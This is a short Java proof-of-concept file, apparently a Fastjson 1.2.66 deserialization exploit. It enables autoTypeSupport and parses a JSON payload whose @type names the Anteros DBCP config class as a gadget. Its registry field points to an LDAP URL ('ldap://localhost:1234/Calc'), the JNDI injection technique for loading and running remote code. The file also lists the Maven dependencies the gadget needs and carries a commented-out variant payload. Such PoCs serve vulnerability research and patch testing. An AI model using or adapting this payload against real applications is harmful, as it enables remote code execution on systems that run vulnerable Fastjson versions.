package Poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.rmi.server.ExportException;
/*
    需要开启autoTypeSupport
    <dependency>
        <groupId>com.codahale.metrics</groupId>
        <artifactId>metrics-healthchecks</artifactId>
        <version>3.0.2</version>
    </dependency>
    <dependency>
        <groupId>br.com.anteros</groupId>
        <artifactId>Anteros-Core</artifactId>
        <version>1.2.1</version>
    </dependency>
    <dependency>
        <groupId>br.com.anteros</groupId>
        <artifactId>Anteros-DBCP</artifactId>
        <version>1.0.1</version>
    </dependency>
*/
public class Poc_1_2_66_b {
    public static void main(String[] args) throws ExportException {
        // turn on autoTypeSupport
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://localhost:1234/Calc\"}";
//        String payload = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:1234/Calc\"}";
        JSON.parse(payload);
    }
}
